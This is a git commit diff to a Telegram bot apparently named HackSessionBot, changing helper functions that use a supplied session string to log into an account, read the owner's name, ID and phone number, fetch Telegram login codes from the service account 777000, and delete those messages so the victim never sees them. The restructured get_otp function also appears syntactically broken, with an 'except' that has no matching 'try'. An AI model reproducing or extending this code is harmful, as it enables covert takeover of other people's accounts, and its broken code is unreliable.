75a84b024eb58af6c80ee98dbb1112a138bb4330
SaliraVoda <161962941+SaliraVoda@users.noreply.github.com>
2024-04-05 16:58:14 +0530

    Update steve.py

--- HackSessionBot/Helpers/steve.py
+++ HackSessionBot/Helpers/steve.py
@@ -21,25 +21,24 @@ from telethon.tl.types import ChannelParticipantsAdmins
 
 async def user_info(session):
     err = ""
+    msg = ""
     try:
         if session.endswith("="):
             steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
             await steve.connect()
-            try:
-                k = await steve.get_me()  
-                msg = info.format((k.first_name if k.first_name else k.last_name),k.id,k.phone,k.username)
-                await steve.disconnect()
-            except Exception as e:
-                print(e)                             
-    else:    
-         async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            k = await steve.get_me()  
+            msg = info.format((k.first_name if k.first_name else k.last_name),k.id,k.phone,k.username)
+            await steve.disconnect()
+    except Exception as e:
+        err += str(e)
+                             
+    if not err:    
+        async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
             try:
                 k = await stark.get_me()
                 msg = info.format((k.first_name if k.first_name else k.last_name),k.id,k.phone_number,k.username)
             except Exception as e:
-                print(e)
-    except Exception as idk:
-        err += str(idk)
+                err += str(e)
                     
     if err:
         return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
@@ -52,25 +51,22 @@ async def get_otp(session):
         if session.endswith("="):
             steve = TelegramClient(StringSession(session),API_ID,API_HASH)   
             await steve.connect()
-            try:
-                async for x in steve.iter_messages(777000, limit=2):               
-                    i += f"\n{x.text}\n"
-                    await steve.delete_dialog(777000)
-                await steve.disconnect() 
-            except Exception as e:
-                print(e)                             
-    else:    
-         async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
-             try:
-                 ok = []
-                 async for message in stark.get_chat_history(777000,limit=2):
-                     i += f"\n{message.text}\n"                                   
-                     ok.append(message.id)                 
-                 await stark.delete_messages(777000,ok)
-             except Exception as e:
-                 print(e)
-    except Exception as idk:
-        err += str(idk)
+            async for x in steve.iter_messages(777000, limit=2):               
+                i += f"\n{x.text}\n"
+                await steve.delete_dialog(777000)
+            await steve.disconnect() 
+    except Exception as e:
+        err += str(e)
+                             
+    if not err:    
+        async with Client("stark",api_id=API_ID,api_hash=API_HASH, session_string=session) as stark:
+            ok = []
+            async for message in stark.get_chat_history(777000,limit=2):
+                i += f"\n{message.text}\n"                                   
+                ok.append(message.id)                 
+            await stark.delete_messages(777000,ok)
+    except Exception as e:
+        err += str(e)
                     
     if err:
         return "**ᴇʀʀᴏʀ:** " + err + "\n**ᴛʀʏ ᴀɢᴀɪɴ /hack.**"
